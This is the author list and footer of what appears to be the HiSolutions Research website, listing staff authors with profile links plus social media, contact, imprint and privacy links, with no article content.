* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)


